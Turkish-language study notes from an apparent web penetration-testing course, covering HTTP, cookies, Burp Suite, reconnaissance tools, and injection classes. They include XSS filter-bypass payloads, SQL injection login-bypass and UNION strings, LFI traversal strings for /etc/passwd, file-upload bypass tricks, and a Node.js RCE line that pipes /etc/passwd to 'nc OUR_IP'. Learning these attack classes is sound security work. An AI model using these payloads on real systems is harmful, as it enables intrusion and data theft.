## HTML Girdi Alanları

- HTML Form

- Method attr (GET, POST, PUT, DELETE, HEAD...)

- Action attr.

- Input Attr:	Type attr (text, password, email, radio etc.)

- Name attr.

- HTML Pure AJAX Request: Gözle göremediğimiz arka planda görülen istekler. Bu istekleri izleyebilmemiz için Burp Suite Proxy uygulaması veya tarayıcı bazlı uygulamalar kullanmalıyız.

- HTML JQuery AJAX Request

- HTML iframe / img Tags

- Javascript

## HTTP:

- Http'nin çalışma mantığı: Sunucuda varolan verileri istemci sunucudan ister. Önce TCP bağlantısı açılır (3-way Handshake). Kullanıcı HTTP isteği gönderir ve sunucu da buna uygun cevap döner. TCP bağlantısı kapatılır.

- HTTP Header'ini Burp Suite Proxy veya tarayıcı bazlı programlar ile değiştirebiliriz.

- Header:
	- Referrer: Nereden geldiğimizin bilgisi. (örnek: google.com)
	- Cookie: Bizim kimlik bilgimiz.

- POST metodunda yolladığımız input'lar, en alttaki değerden sonra iki yeni satır bırakıldıktan sonra yazılır.
- X-Powered-By: Bu kısımda PHP/5.3.29 şeklinde bir çıktı olabilir. Versiyon bilgisini öğrenmek için kullanılabilir.

- RESPONSE içerisinde set-cookie değeri varsa, bu değer tarayıcıya atanır.

## RESPONSE Kodları:
- 2XX: Success
- 3XX: Yönlendirme
- 4XX: Not found
- 5XX: Server kaynaklı hatalar

## Cookies:

- Session nedir?

	- Ben uygulama içerisinde parolamı girdiğim zaman bana ona uygun bir session başlatılır. Session sunucuda, cookie istemcide tutulur. İstemcideki cookie değiştirilebilir. Sunucuya tekrar istek yolladığım zaman cookie ile session uyuyorsa giriş yapmadan direk o cookie değeri için açılmış olan session'a sahip olan kullanıcı olarak giriş yapmış olurum.

## Secure Flag

- Eğer websitesi HTTPS ile haberleşiyorsa, sadece HTTPS isteklerde cookie'yi ekler. set-cookie içerisinde "Secure;" şeklinde eklenir.

## HTTPOnly Flag

- Üçüncü parti uygulamalar ile cookie'ye ulaşılmaması için kullanılır.

- Cookie'ler subdomain'lere de eklenir.

## Burp Suite Proxy

- Proxy uygulaması ne işe yarar?

	- Proxy uygulaması istemci ile sunucu arasına girmemizi sağlar. Bir port açar ve tarayıcıyı oraya yönlendiririz.

			B> http://burp 	(CA Cert. indirip sertifikayı ekle.)

**- Scope:** Kapsamı değiştirip hedefleri daraltabiliriz. Paketin üzerine sağ tıklayıp "add to scope" seçeneği ile ekleyebiliriz.

**- Show only items in scope** seçeneği ile HTTP History benzeri ekranı daha temiz görebiliriz.

**- Intercept:** Paketi sunucuya gitmeden önce durdurup elden geçiriyoruz.

**- Repeater:** İstekleri editleyip tekrar gönderebilir.

**- Intruder:** FUZZ etmemize yarar.

**- Comparer:** İstekleri karşılaştırarak hangi alanların değiştiğini gösterir.

## Bilgi Toplama ve Haritalandırma Yöntemleri

1) Uygulama Mimarisi:

- Hangi uygulamalar kullanılmış? 
	
- Bu uygulamaları edinebilir miyim?

2) Sunucu ve Alan Adı Mimarisi:

- Sunucu nerede host ediliyor? Kim tarafından?

- Alan adını kim almış? vs..

**Firefox eklentileri** => wappalyzer, resurrect-pages

	B> isube.bgabank.com => (View Page Source)
	
- Hedefte hem php hem de asp.net kullanıldığını gördük. Bunlar manipüle edilmiş ve şaşırtma için kullanılmış olabilir.

- dirb veya wfuzz kullanarak kapsamı genişletiriz.

		=> dirb http://isube.bgabank.com

		B> http://isube.bgabank.com/giris.aspx

- Uygulama dışarıdan başka bir uygulama ile etkileşime geçiyor mu?

	- Hedef siteye rasgele bir giriş yaparız ve Burp ile izleriz. Burp'de görülen RESPONSE header'inde dışarıya iletişime geçmediği görülüyor. Uygulamaya hata verdirerek veritabanı hakkında bilgi alabiliriz. Bunun için girişte kullandığımız REQUEST Header'ini repeater'a yollayarak header'i manipüle etmemiz gerek.

- View Page Source ile javascript dosyalarını inceleriz.

- Hedefin IP adresini alırız.

- archive.org kaydına bakarız.

		B> isube.bgabank.com/giris_new.aspx 	(Bu şekilde yedeklenmiş olabilir.)
		
		B> isube.bgabank.com/girisqwe.aspx	(Uygulamaya hata verdirterek gerçekten ne kullanıldığını öğrenebiliriz. Burada aslında arkada PHP'nin çalıştığını görüyoruz. Apache üzerinden yapılan bir konfigürasyon ile yanıltmak için kullanılan bir yöntem.)

- Kaynak kodunda hidden, input kelimelerini aratırız.

## Sunucu ve Alan Adı Mimarisine Yönelik Bilgi Toplama Yöntemleri

- whois sorgusu yapabiliriz. Kullandığı e-mail adresi kendi mail sunucusuna aitse mail sunucusuna sızarak domain'i ele geçirebiliriz.

- Uygulamayı yazan şirketi araştırabiliriz.

- IP sınıflarını kullanarak elde edeceğimiz bilgilerle, diğer IP adreslerine istek yollayabiliriz. Hedefimizi genişletmiş oluruz.

		B> viewdns.info

		=> dnsrecon aracı ile sublist araması yapabiliriz.

		=> nmap --script http-vhosts.nse	(sanal sunucuları tespit etmek için kullanılan script)

		B> bing => IP: filtresiyle tarama yaparak kapsamı genişletebiliriz.

		B> shodan.io=> ip:85.95.242.0/24

- nmap'in http scriptleri kullanılabilir.

- Veritabanına bir DOS saldırısı yaparak veritabanı bağlantı isteğini görebilme ihtimalimiz var.

- OWASP 2013 Top 10 List

## Injection nedir?

- Bir girdi noktasına enjeksiyon yapmak.

| Server |	Client |
|----------|---------|
| SQL Injection | XSS |
| LFI | HTML |
| RFI | CSRF |

## XSS 

- Eğer gerekli kod güvenlikleri alınmamışsa, kullanıcıların bilgilerini çalmak için kullanılır.

**1) DOM:**

**2) Reflected:** URL kısmındaki parametrelerde olur. Parametreye verdiğimiz kod o anda çalışır ve sunucuda depolanmaz.

**3) Stored:** Forma gönderdiğimiz verileri arkada depolar, oraya giren herkeste bizim oraya gömdüğümüz kod çalışır.

- Javascript, URL ve HTML'i encode ederek filtreleri bypass edebiliriz. URL encode örnek: %2527(?) -> %25 tekrar % oluyor, filtreden sonra sonuç: -> %27

## Örnekler

	=> melihzeytun.com/xss/index2.php?test="qwe'qw 	(Kaynağı görüntülediğimizde test parametresine verdiğimiz değerlerin nereye basıldığını görürüz.)

	=> http://melihzeytun.com/xss/index3.php?test=0;alert(1)	(Reflected XSS)

	=> http://melihzeytun.com/siberkamp/vulns/xss/xss1.php?url=<payload>
		url=aalertlalertealertralerttalert(1); 
		url=alalertert(1);

	=> http://melihzeytun.com/siberkamp/vulns/xss/xss2.php?url=<payload>
		url=" onclick="alalertert(1);
	
	=> http://melihzeytun.com/siberkamp/vulns/xss/xss3.php?url=<payload>
		" oncalertlick="alalertert(1);
		" onmouse;over="alalertert(1);
		" on;click="alalert(1);
		javascr;ipt:alalertert(1);
		javascralertipt:alalertert(1);

- Eğer değerin içerisine bir şey enjekte edemiyorsak, değerin dışına çıkmayı denemeliyiz.

		=> http://melihzeytun.com/siberkamp/vulns/xss/xss4.php?url=<payload>
			lol" accesskey="C" onclick="alalertert(1)
			alt + C bastığımızda onclick fonksiyonu tetiklenecek.

		=> http://melihzeytun.com/xss/upper.php?xss=<payload>
			<script src='HTTP://MELIHZEYTUN.COM/JS/SCR.JS'></script>

## Angular JS

- Kaynak kodda .js ile biten dosyalara bakarız. JS dosyalarının en üstünde Angular JS olduğuna dair bir mesaj vardır. 

		B> portswigger angularjs
		B> http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html 	(Örnek exploit'ler)

## SQL 

**- CREATE:** Tablo oluşturma fonksiyonu

**- SELECT:** SELECT CustomerName,City FROM Customers where City='Berlin';

**- INSERT:** INSERT INTO calısanlar VALUES("Sinan","Kemal");

- SQL Syntax: 

	Yorum satırı => -- veya #

**- Error Based SQL Injection:** Eğer yazdığımız parametreden kaynaklı bir sql hatası oluşuyorsa sql injection olduğuna kanaat getirebiliriz.

**- Blind SQL Injection:** False ya da True değerler döndüren açıklıklara blind sql denir.

**- Time Based SQL Injection:** Veritabanının bize sağladığı delay fonksiyonu sayesinde ne kadar beklediğimize göre karar verdiğimiz açık türleridir.

**- Boolean Based SQL Injection:** Boolean kullanarak oluşturulan SQL injection'ları. (1 or 1=1)

**- SQL Injection Login Bypass**

	B> isube.bgabank.com/giris.aspx

	Burp > Proxy -> Request header'ini repeater'a yolla.

	Captcha çıktıktan sonra captcha ile istek yaptığımız headeri repeater'a yolla.

	b_muaterino=10000001"--&b_password=12342342342&captcha=seaerbf

**- Sqlmap ile SQL Injection İstismarı**

	=> sqlmap -u url -p id --dbs	(-p = parametre)

**- UNION Komutu:**

	=> .php?id=2 union select 1,2,3-- 	(UNION komutu birden fazla sorgu çekmemizi sağlar. Ancak yapılan sorguların sütun sayısı eşit olmalıdır.

	=> .php?id=2 and 1=0 union 1,version(),3-- 

## LFI/RFI

**- LFI:** Yerel dosya dahil etme

**- RFI:** Uzaktaki dosyayı dahil etme

	B> wwww.wellho.net/resources/ex.php4item=<payload>
		../../../../../etc/passwd
		..%2f..%2f..%2f..%2fetc%2fpasswd
		..././..././..././etc/passwd
		...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd

## Dosya yükleme

- Uzantı: shell.jpg.aspx

- Boyut: DOS için kullanılabilir.

- Dosya Tipi: Header'daki Content-Type kontrol ediliyorsa Burp Suite kullanarak repeater'da .jpg.aspx karşıya geçtikten sonra uzantıdaki jpg'yi silip .aspx bırakabiliriz.

- Dosya Adı: HEADER'da dosya adını değiştirerek güvenlikleri atlatabiliriz. 
	GET ../shell.php HTTP/1.1

## RCE

**- Remote Code Execution/Injection:** shell_exec, passthru, eval benzeri komutların parametreleri, kullanıcıdan girdi olarak alınıyor ise kod enjekte edilebilir

	=> REQUEST HEADER'ın en altına yerleştir:
		require('child_process').exec('cat+/etc/passswd+|+nc+OUR_IP+80')

